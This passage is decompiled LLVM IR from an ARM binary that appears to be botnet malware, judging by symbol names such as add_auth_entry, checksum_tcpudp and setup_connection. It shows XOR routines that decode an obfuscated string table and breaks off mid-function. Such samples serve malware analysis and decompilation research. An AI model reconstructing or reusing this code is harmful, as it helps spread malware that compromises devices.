  uselistorder i32* %r0.global-to-local, { 110, 109, 111, 112, 113, 115, 114, 116, 117, 118, 119, 121, 122, 120, 82, 81, 83, 85, 84, 86, 87, 88, 90, 89, 23, 25, 126, 123, 1, 3, 2, 4, 124, 125, 0, 127, 91, 166, 59, 61, 60, 93, 92, 94, 96, 95, 97, 99, 98, 100, 26, 6, 5, 8, 7, 10, 9, 11, 62, 13, 12, 14, 16, 15, 18, 17, 19, 20, 21, 22, 28, 27, 30, 29, 196, 24, 32, 31, 33, 34, 35, 37, 36, 39, 38, 41, 40, 42, 44, 43, 45, 47, 46, 49, 48, 50, 51, 53, 52, 55, 54, 57, 56, 58, 64, 63, 65, 67, 66, 69, 68, 71, 70, 72, 73, 75, 74, 77, 76, 79, 78, 80, 102, 104, 103, 105, 101, 106, 107, 180, 165, 170, 168, 169, 175, 171, 172, 167, 173, 174, 176, 178, 177, 179, 181, 186, 182, 185, 183, 184, 189, 187, 188, 192, 190, 191, 194, 193, 108, 164, 195, 128, 129, 131, 130, 133, 132, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 153, 152, 154, 159, 155, 156, 157, 158, 160, 161, 162, 163 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 0, 11, 14, 12, 13, 15, 23, 16, 17, 18, 19, 20, 21, 22, 1, 5, 6, 7, 8, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 108, 109, 196, 239, 181, 1, 159, 161, 125, 126, 110, 124, 112, 114, 115, 65, 66, 67, 68, 69, 0, 111, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 113, 17, 18, 23, 19, 20, 21, 22, 24, 25, 26, 27, 28, 32, 33, 34, 29, 30, 31, 35, 36, 37, 38, 39, 40, 44, 45, 46, 41, 42, 43, 47, 48, 49, 50, 51, 52, 56, 57, 58, 53, 54, 55, 59, 60, 61, 62, 63, 64, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 183, 87, 88, 89, 84, 85, 86, 90, 91, 92, 93, 94, 95, 99, 100, 101, 96, 97, 98, 102, 103, 104, 105, 106, 107, 116, 117, 118, 119, 182, 184, 185, 186, 188, 189, 190, 192, 193, 194, 195, 187, 191, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 209, 211, 212, 210, 207, 208, 151, 145, 139, 213, 141, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 140, 123, 142, 143, 122, 144, 146, 121, 147, 148, 149, 150, 152, 153, 120, 154, 155, 156, 157, 158, 180, 160, 162, 163, 179, 164, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 165, 178 }
  uselistorder i1* %cpsr_c.global-to-local, { 105, 106, 193, 232, 179, 1, 122, 150, 152, 123, 107, 121, 108, 110, 111, 65, 66, 67, 68, 0, 120, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 109, 17, 18, 23, 19, 20, 21, 22, 24, 25, 26, 27, 28, 32, 33, 34, 29, 30, 31, 35, 36, 37, 38, 39, 40, 44, 45, 46, 41, 42, 43, 47, 48, 49, 50, 51, 52, 56, 57, 58, 53, 54, 55, 59, 60, 61, 62, 63, 64, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 115, 84, 85, 86, 81, 82, 83, 87, 88, 89, 90, 91, 92, 96, 97, 98, 93, 94, 95, 99, 100, 101, 102, 103, 104, 112, 113, 114, 180, 183, 182, 184, 186, 187, 188, 189, 190, 191, 192, 181, 185, 194, 195, 196, 197, 198, 199, 200, 201, 204, 206, 207, 205, 202, 203, 144, 139, 128, 208, 130, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 124, 125, 126, 127, 129, 131, 132, 133, 134, 135, 136, 137, 138, 119, 140, 141, 118, 142, 143, 117, 145, 146, 147, 148, 149, 151, 116, 153, 154, 155, 156, 157, 178, 158, 160, 161, 177, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 159, 176 }
  uselistorder i32 (i32)* @inet_addr, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_1927c.91 to i32), { 0, 2, 1, 3 }
  uselistorder i16** @global_var_21c60.145, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_21c60.145 to i16*), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 8, 4, 5 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_19320.205 to i32), { 5, 7, 6, 8, 2, 9, 0, 10, 1, 11, 3, 12, 4, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 14, 13, 12, 11, 10, 9, 8, 20, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 19, 18, 17, 16, 15, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 6, 7, 2, 3, 4, 5, 8, 9, 10, 11 }
  uselistorder i8 34, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 36, { 0, 1, 2, 3, 4, 5, 14, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i8 35, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 17, 18, 19, 8, 9, 10, 11, 12, 13, 14, 15, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i8 58, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 57, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 62, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 61, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i32 (i32)* @table_lock_val, { 28, 41, 40, 27, 34, 39, 38, 37, 36, 35, 33, 32, 31, 30, 29, 26, 2, 24, 23, 22, 25, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 1, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10, 34, 12, 13, 14, 11, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37 }
  uselistorder i32 (i32)* @table_unlock_val, { 23, 22, 31, 30, 29, 28, 27, 26, 25, 24, 21, 3, 19, 18, 17, 20, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 284, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i32 254, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 2, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32* @global_var_21c4c.200, { 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_21c48.158 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 4, 11, 10, 9, 8, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder i16* bitcast (i32* @global_var_21c3e.197 to i16*), { 1, 0, 2 }
  uselistorder i32 16711680, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 21, 22, 19, 20, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_19300.191 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_192f8.189 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_192bc.177 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint (i32* @global_var_1929c.167 to i32), { 1, 2, 0, 3 }
  uselistorder i8* @global_var_21c55.164, { 1, 0 }
  uselistorder i16* @global_var_21c4a.163, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2, 3 }
  uselistorder i32 5888, { 2, 0, 3, 1 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 13, 0, 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i16* @global_var_21c48.158, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16* @global_var_21c48.158 to i32), { 5, 2, 1, 0, 4, 3 }
  uselistorder i8* @global_var_21c54.159, { 1, 0 }
  uselistorder i32 10240, { 1, 0, 2 }
  uselistorder i8** @global_var_21c34.155, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_21c34.155 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @rand_next, { 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 0, 28, 27, 26, 25, 24, 23, 22, 21, 3, 2, 1, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32* @global_var_2474c.153, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_24748.151, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @global_var_21c64.139, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_2472c.58, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_2472c.58 to i32), { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fc40, { 1, 0 }
  uselistorder label %dec_label_pc_fc38, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_fc2c, { 1, 0 }
  uselistorder label %dec_label_pc_ef7c.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ef7c.backedge.thread561, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_ef7c.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fa1c, { 1, 0 }
  uselistorder label %dec_label_pc_f97c, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_f944, { 1, 0 }
  uselistorder label %dec_label_pc_f930, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f920, { 1, 0 }
  uselistorder label %dec_label_pc_f810, { 1, 0 }
  uselistorder label %dec_label_pc_f790, { 5, 3, 4, 2, 6, 1, 0 }
  uselistorder label %dec_label_pc_f75c, { 1, 0 }
  uselistorder label %thread-pre-split124, { 1, 0 }
  uselistorder label %dec_label_pc_f70c, { 1, 0 }
  uselistorder label %dec_label_pc_f650, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f638, { 1, 0 }
  uselistorder label %dec_label_pc_f504, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f4ec, { 1, 0 }
  uselistorder label %dec_label_pc_f430, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f418, { 1, 0 }
  uselistorder label %dec_label_pc_f3a4, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread103, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f370, { 1, 0 }
  uselistorder label %.thread99, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f350, { 1, 0 }
  uselistorder label %dec_label_pc_f33c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f2f8, { 1, 0 }
  uselistorder label %dec_label_pc_f2f8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f28c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f274, { 1, 0 }
  uselistorder label %dec_label_pc_f1b8, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f1a0, { 1, 0 }
  uselistorder label %dec_label_pc_f080, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb424, { 1, 0 }
  uselistorder label %bb422, { 1, 0 }
  uselistorder label %dec_label_pc_f048, { 1, 0 }
  uselistorder label %dec_label_pc_efe0, { 1, 0 }
  uselistorder label %.thread82, { 1, 0 }
  uselistorder label %dec_label_pc_ef94, { 1, 0 }
  uselistorder label %dec_label_pc_ef84, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ef84.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_ef60, { 1, 0 }
  uselistorder label %bb418, { 1, 0 }
  uselistorder label %dec_label_pc_ee84, { 1, 0 }
  uselistorder label %bb416, { 1, 0 }
  uselistorder label %bb414, { 1, 0 }
  uselistorder label %bb412, { 1, 0 }
  uselistorder label %bb410, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_ed78.dec_label_pc_ed78_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ed54.dec_label_pc_ed54_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ed48, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_ed30, { 1, 0 }
  uselistorder label %dec_label_pc_ed0c, { 1, 0 }
  uselistorder label %dec_label_pc_ebc0, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_ebac, { 1, 0 }
  uselistorder label %bb407, { 1, 0 }
  uselistorder label %dec_label_pc_ea40, { 1, 0 }
  uselistorder label %dec_label_pc_ea34, { 1, 0 }
  uselistorder label %dec_label_pc_ea28, { 1, 0 }
  uselistorder label %dec_label_pc_ea1c, { 1, 0 }
  uselistorder label %dec_label_pc_ea10, { 1, 0 }
  uselistorder label %dec_label_pc_e9fc, { 1, 0 }
  uselistorder label %dec_label_pc_e9e8, { 1, 0 }
  uselistorder label %dec_label_pc_e9d4, { 1, 0 }
  uselistorder label %dec_label_pc_e9b4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e990, { 1, 0 }
  uselistorder label %dec_label_pc_e984, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e960, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e93c, { 1, 0 }
  uselistorder label %bb374, { 1, 0 }
  uselistorder label %dec_label_pc_e8e8, { 30, 6, 26, 2, 27, 3, 28, 4, 29, 5, 10, 0, 11, 12, 13, 14, 7, 8, 9, 15, 16, 17, 18, 19, 20, 21, 22, 23, 1, 24, 25, 31 }
  uselistorder label %dec_label_pc_e6d8, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_24758.215 to i32), i32* @r2, align 4
  %v3_fce8 = mul i32 %arg1, 8
  %v2_fcec = add i32 %v3_fce8, ptrtoint (i32* @global_var_24758.215 to i32)
  store i32 %v2_fcec, i32* @r3, align 4
  %v2_fcf0 = icmp eq i32* %arg2, null
  br i1 %v2_fcf0, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_fcf84 = inttoptr i32 %v2_fcec to i32*
  %v4_fcf85 = load i32, i32* %v3_fcf84, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_fcf4 = add i32 %v3_fce8, add (i32 ptrtoint (i32* @global_var_24758.215 to i32), i32 4)
  %v3_fcf4 = inttoptr i32 %v2_fcf4 to i16*
  %v4_fcf4 = load i16, i16* %v3_fcf4, align 4
  %v5_fcf4 = zext i16 %v4_fcf4 to i32
  store i32 %v5_fcf4, i32* @r3, align 4
  %v3_fcf8 = inttoptr i32 %v2_fcec to i32*
  %v4_fcf8 = load i32, i32* %v3_fcf8, align 4
  store i32 %v5_fcf4, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_fcf86 = phi i32 [ %v4_fcf85, %.thread ], [ %v4_fcf8, %bb ]
  ret i32 %v4_fcf86

; uselistorder directives
  uselistorder i32 %v2_fcec, { 1, 0, 2 }
  uselistorder i32 %v3_fce8, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fd10 = mul i32 %arg1, 8
  %v2_fd14 = add i32 %v3_fd10, ptrtoint (i32* @global_var_24758.215 to i32)
  %v2_fd18 = load i32, i32* @global_var_21aa8.218, align 4
  store i32 %v2_fd18, i32* @r1, align 4
  %v1_fd1c = add i32 %v3_fd10, add (i32 ptrtoint (i32* @global_var_24758.215 to i32), i32 4)
  %v2_fd1c = inttoptr i32 %v1_fd1c to i16*
  %v3_fd1c = load i16, i16* %v2_fd1c, align 4
  %v3_fd20 = udiv i32 %v2_fd18, 256
  %v2_fd24 = icmp eq i16 %v3_fd1c, 0
  %v3_fd28 = udiv i32 %v2_fd18, 65536
  store i32 %v3_fd28, i32* @r3, align 4
  %v3_fd2c = load i32, i32* @r4, align 4
  store i32 %v3_fd2c, i32* %stack_var_-16, align 4
  %v1_fd30 = urem i32 %v3_fd20, 256
  store i32 %v1_fd30, i32* %r6.global-to-local, align 4
  %v1_fd34 = urem i32 %v3_fd28, 256
  store i32 %v1_fd34, i32* %r5.global-to-local, align 4
  %v3_fd38 = udiv i32 %v2_fd18, 16777216
  store i32 %v3_fd38, i32* %r4.global-to-local, align 4
  %v1_fd3c = urem i32 %v2_fd18, 256
  store i32 %v1_fd3c, i32* %lr.global-to-local, align 4
  br i1 %v2_fd24, label %dec_label_pc_fd98, label %dec_label_pc_fd44

dec_label_pc_fd44:                                ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_fd48 = inttoptr i32 %v2_fd14 to i32*
  br label %dec_label_pc_fd48

dec_label_pc_fd48:                                ; preds = %dec_label_pc_fd48.dec_label_pc_fd48_crit_edge, %dec_label_pc_fd44
  %v0_fd50 = phi i32 [ %v0_fd50.pre, %dec_label_pc_fd48.dec_label_pc_fd48_crit_edge ], [ %v1_fd3c, %dec_label_pc_fd44 ]
  %v2_fd54 = phi i32 [ %v1_fd8c, %dec_label_pc_fd48.dec_label_pc_fd48_crit_edge ], [ 0, %dec_label_pc_fd44 ]
  %v2_fd48 = load i32, i32* %v1_fd48, align 4
  %v2_fd4c = add i32 %v2_fd48, %v2_fd54
  %v3_fd4c = inttoptr i32 %v2_fd4c to i8*
  %v4_fd4c = load i8, i8* %v3_fd4c, align 1
  %v6_fd4c = zext i8 %v4_fd4c to i32
  %v2_fd50 = xor i32 %v6_fd4c, %v0_fd50
  %v1_fd54 = trunc i32 %v2_fd50 to i8
  store i8 %v1_fd54, i8* %v3_fd4c, align 1
  %v2_fd58 = load i32, i32* %v1_fd48, align 4
  %v0_fd5c = load i32, i32* @ip, align 4
  %v2_fd5c = add i32 %v0_fd5c, %v2_fd58
  %v3_fd5c = inttoptr i32 %v2_fd5c to i8*
  %v4_fd5c = load i8, i8* %v3_fd5c, align 1
  %v6_fd5c = zext i8 %v4_fd5c to i32
  %v0_fd60 = load i32, i32* %r6.global-to-local, align 4
  %v2_fd60 = xor i32 %v0_fd60, %v6_fd5c
  %v1_fd64 = trunc i32 %v2_fd60 to i8
  store i8 %v1_fd64, i8* %v3_fd5c, align 1
  %v2_fd68 = load i32, i32* %v1_fd48, align 4
  %v0_fd6c = load i32, i32* @ip, align 4
  %v2_fd6c = add i32 %v0_fd6c, %v2_fd68
  %v3_fd6c = inttoptr i32 %v2_fd6c to i8*
  %v4_fd6c = load i8, i8* %v3_fd6c, align 1
  %v6_fd6c = zext i8 %v4_fd6c to i32
  %v0_fd70 = load i32, i32* %r5.global-to-local, align 4
  %v2_fd70 = xor i32 %v0_fd70, %v6_fd6c
  %v1_fd74 = trunc i32 %v2_fd70 to i8
  store i8 %v1_fd74, i8* %v3_fd6c, align 1
  %v2_fd78 = load i32, i32* %v1_fd48, align 4
  store i32 %v2_fd78, i32* @r1, align 4
  %v0_fd7c = load i32, i32* @ip, align 4
  %v2_fd7c = add i32 %v0_fd7c, %v2_fd78
  %v3_fd7c = inttoptr i32 %v2_fd7c to i8*
  %v4_fd7c = load i8, i8* %v3_fd7c, align 1
  %v6_fd7c = zext i8 %v4_fd7c to i32
  %v0_fd80 = load i32, i32* %r4.global-to-local, align 4
  %v2_fd80 = xor i32 %v0_fd80, %v6_fd7c
  store i32 %v2_fd80, i32* @r3, align 4
  %v1_fd84 = trunc i32 %v2_fd80 to i8
  store i8 %v1_fd84, i8* %v3_fd7c, align 1
  %v3_fd88 = load i16, i16* %v2_fd1c, align 4
  %v4_fd88 = zext i16 %v3_fd88 to i32
  %v0_fd8c = load i32, i32* @ip, align 4
  %v1_fd8c = add i32 %v0_fd8c, 1
  store i32 %v1_fd8c, i32* @ip, align 4
  %v8_fd94 = icmp sgt i32 %v4_fd88, %v1_fd8c
  br i1 %v8_fd94, label %dec_label_pc_fd48.dec_label_pc_fd48_crit_edge, label %dec_label_pc_fd98.loopexit

dec_label_pc_fd48.dec_label_pc_fd48_crit_edge:    ; preds = %dec_label_pc_fd48
  %v0_fd50.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_fd48

dec_label_pc_fd98.loopexit:                       ; preds = %dec_label_pc_fd48
  %v2_fd98.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fd98

dec_label_pc_fd98:                                ; preds = %dec_label_pc_fd98.loopexit, %entry
  %v2_fd98 = phi i32 [ %v2_fd98.pre, %dec_label_pc_fd98.loopexit ], [ %v3_fd2c, %entry ]
  store i32 %v2_fd98, i32* @r4, align 4
  ret i32 %v2_fd14

; uselistorder directives
  uselistorder i32 %v1_fd8c, { 1, 2, 0 }
  uselistorder i32 %v1_fd3c, { 1, 0 }
  uselistorder i32 %v3_fd28, { 1, 0 }
  uselistorder i32 %v2_fd18, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_fd10, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fdb0 = mul i32 %arg1, 8
  %v2_fdb4 = add i32 %v3_fdb0, ptrtoint (i32* @global_var_24758.215 to i32)
  %v2_fdb8 = load i32, i32* @global_var_21aa8.218, align 4
  %v1_fdbc = add i32 %v3_fdb0, add (i32 ptrtoint (i32* @global_var_24758.215 to i32), i32 4)
  %v2_fdbc = inttoptr i32 %v1_fdbc to i16*
  %v3_fdbc = load i16, i16* %v2_fdbc, align 4
  %v3_fdc0 = udiv i32 %v2_fdb8, 256
  %v2_fdc4 = icmp eq i16 %v3_fdbc, 0
  %v3_fdc8 = udiv i32 %v2_fdb8, 65536
  %v3_fdcc = load i32, i32* @r4, align 4
  store i32 %v3_fdcc, i32* %stack_var_-16, align 4
  %v1_fdd0 = urem i32 %v3_fdc0, 256
  store i32 %v1_fdd0, i32* %r6.global-to-local, align 4
  %v1_fdd4 = urem i32 %v3_fdc8, 256
  store i32 %v1_fdd4, i32* %r5.global-to-local, align 4
  %v3_fdd8 = udiv i32 %v2_fdb8, 16777216
  store i32 %v3_fdd8, i32* %r4.global-to-local, align 4
  %v1_fddc = urem i32 %v2_fdb8, 256
  store i32 %v1_fddc, i32* %lr.global-to-local, align 4
  br i1 %v2_fdc4, label %dec_label_pc_fe38, label %dec_label_pc_fde4

dec_label_pc_fde4:                                ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_fde8 = inttoptr i32 %v2_fdb4 to i32*
  br label %dec_label_pc_fde8

dec_label_pc_fde8:                                ; preds = %dec_label_pc_fde8.dec_label_pc_fde8_crit_edge, %dec_label_pc_fde4
  %v0_fdf0 = phi i32 [ %v0_fdf0.pre, %dec_label_pc_fde8.dec_label_pc_fde8_crit_edge ], [ %v1_fddc, %dec_label_pc_fde4 ]
  %v2_fdf4 = phi i32 [ %v1_fe2c, %dec_label_pc_fde8.dec_label_pc_fde8_crit_edge ], [ 0, %dec_label_pc_fde4 ]
  %v2_fde8 = load i32, i32* %v1_fde8, align 4
  %v2_fdec = add i32 %v2_fde8, %v2_fdf4
  %v3_fdec = inttoptr i32 %v2_fdec to i8*
  %v4_fdec = load i8, i8* %v3_fdec, align 1
  %v6_fdec = zext i8 %v4_fdec to i32
  %v2_fdf0 = xor i32 %v6_fdec, %v0_fdf0
  %v1_fdf4 = trunc i32 %v2_fdf0 to i8
  store i8 %v1_fdf4, i8* %v3_fdec, align 1
  %v2_fdf8 = load i32, i32* %v1_fde8, align 4
  %v0_fdfc = load i32, i32* @ip, align 4
  %v2_fdfc = add i32 %v0_fdfc, %v2_fdf8
  %v3_fdfc = inttoptr i32 %v2_fdfc to i8*
  %v4_fdfc = load i8, i8* %v3_fdfc, align 1
  %v6_fdfc = zext i8 %v4_fdfc to i32
  %v0_fe00 = load i32, i32* %r6.global-to-local, align 4
  %v2_fe00 = xor i32 %v0_fe00, %v6_fdfc
  %v1_fe04 = trunc i32 %v2_fe00 to i8
  store i8 %v1_fe04, i8* %v3_fdfc, align 1
  %v2_fe08 = load i32, i32* %v1_fde8, align 4
  %v0_fe0c = load i32, i32* @ip, align 4
  %v2_fe0c = add i32 %v0_fe0c, %v2_fe08
  %v3_fe0c = inttoptr i32 %v2_fe0c to i8*
  %v4_fe0c = load i8, i8* %v3_fe0c, align 1
  %v6_fe0c = zext i8 %v4_fe0c to i32
  %v0_fe10 = load i32, i32* %r5.global-to-local, align 4
  %v2_fe10 = xor i32 %v0_fe10, %v6_fe0c
  %v1_fe14 = trunc i32 %v2_fe10 to i8
  store i8 %v1_fe14, i8* %v3_fe0c, align 1
  %v2_fe18 = load i32, i32* %v1_fde8, align 4
  %v0_fe1c = load i32, i32* @ip, align 4
  %v2_fe1c = add i32 %v0_fe1c, %v2_fe18
  %v3_fe1c = inttoptr i32 %v2_fe1c to i8*
  %v4_fe1c = load i8, i8* %v3_fe1c, align 1
  %v6_fe1c = zext i8 %v4_fe1c to i32
  %v0_fe20 = load i32, i32* %r4.global-to-local, align 4
  %v2_fe20 = xor i32 %v0_fe20, %v6_fe1c
  %v1_fe24 = trunc i32 %v2_fe20 to i8
  store i8 %v1_fe24, i8* %v3_fe1c, align 1
  %v3_fe28 = load i16, i16* %v2_fdbc, align 4
  %v4_fe28 = zext i16 %v3_fe28 to i32
  %v0_fe2c = load i32, i32* @ip, align 4
  %v1_fe2c = add i32 %v0_fe2c, 1
  store i32 %v1_fe2c, i32* @ip, align 4
